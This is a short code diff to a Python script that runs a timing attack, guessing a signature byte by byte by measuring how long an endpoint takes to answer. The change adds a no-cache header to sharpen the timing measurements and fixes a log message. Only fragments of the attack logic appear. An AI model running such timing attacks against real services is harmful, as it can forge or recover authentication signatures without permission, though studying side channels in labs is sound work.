@@ -38,8 +38,7 @@ def measure_request(signature, results):
     logger.debug("Entering measure_request")
     url = input_attack_endpoint.format(input_eventid, signature)
     logger.debug("Target URL: {0}".format(url))
-    # @TODO change to milliseconds
-    elapsed_time = requests.get(url, verify=False).elapsed.total_seconds()
+    elapsed_time = requests.get(url, headers={'cache-control': 'no-cache'}, verify=False).elapsed.total_seconds()
     results.append((signature, elapsed_time))
     logger.debug('signature: {0} | elapsed time: {1}'.format(signature, elapsed_time))
 
@@ -110,7 +109,7 @@ def timing_attack():
 
 def run_attack():
     logger.info("Starting timing attack...")
-    logger.info("The attack will do {0} iteration on each byte.".format(input_iterations))
+    logger.info("The attack will do {0} iterations on each byte.".format(input_iterations))
     start = time.time()
     result = timing_attack()
     logger.info("Guessing the signature is {0}".format(''.join(result)))
